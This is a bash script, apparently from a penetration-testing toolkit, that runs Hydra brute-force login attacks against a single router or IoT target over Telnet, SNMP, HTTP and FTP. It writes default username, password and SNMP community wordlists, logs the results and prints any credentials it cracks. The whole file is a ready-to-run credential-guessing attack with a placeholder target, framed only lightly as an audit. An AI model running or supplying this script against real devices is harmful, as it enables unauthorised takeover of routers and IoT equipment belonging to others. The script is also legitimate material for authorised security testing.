#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: IOT/EMBEDDED DEVICES
# Tests Telnet, SNMP, HTTP, FTP on IoT devices
# ═══════════════════════════════════════════════════════════════════

TARGET="192.168.1.1"  # <-- CHANGE THIS TO YOUR TARGET (router/IoT device)

# ═══════════════════════════════════════════════════════════════════

set -euo pipefail  # Enterprise error handling

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/combo_iot_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S).log"

echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK: IOT/EMBEDDED DEVICES" | tee -a "$LOG_FILE"
echo "  Target: $TARGET" | tee -a "$LOG_FILE"
echo "  Testing: Telnet + SNMP + HTTP + FTP" | tee -a "$LOG_FILE"
echo "  Scenario: Network Device / IoT Security Audit" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

[ ! -f "$USERLIST" ] && echo -e "admin\nroot\nuser" > "$USERLIST"
[ ! -f "$PASSLIST" ] && echo -e "admin\npassword\n123456\ndefault" > "$PASSLIST"

# Phase 1: Telnet
echo "━━━ Phase 1: Telnet (Port 23) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f telnet://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 2: SNMP
echo "━━━ Phase 2: SNMP (Port 161) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    echo -e "public\nprivate\ncommunity" > /tmp/snmp_strings.txt
    hydra -P /tmp/snmp_strings.txt -t 4 -f snmp://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/snmp_strings.txt
fi
echo "" | tee -a "$LOG_FILE"

# Phase 3: HTTP (Web Interface)
echo "━━━ Phase 3: HTTP Web Interface (Port 80) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f \
        http-get://"$TARGET/" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 4: FTP
echo "━━━ Phase 4: FTP (Port 21) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f ftp://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Summary
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  IOT DEVICE ATTACK COMPLETE" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"

if grep -q "login:" "$LOG_FILE"; then
    echo "" | tee -a "$LOG_FILE"
    echo "[+] IOT DEVICE CREDENTIALS FOUND:" | tee -a "$LOG_FILE"
    grep "login:" "$LOG_FILE" | tee -a "$LOG_FILE"
fi

exit 0
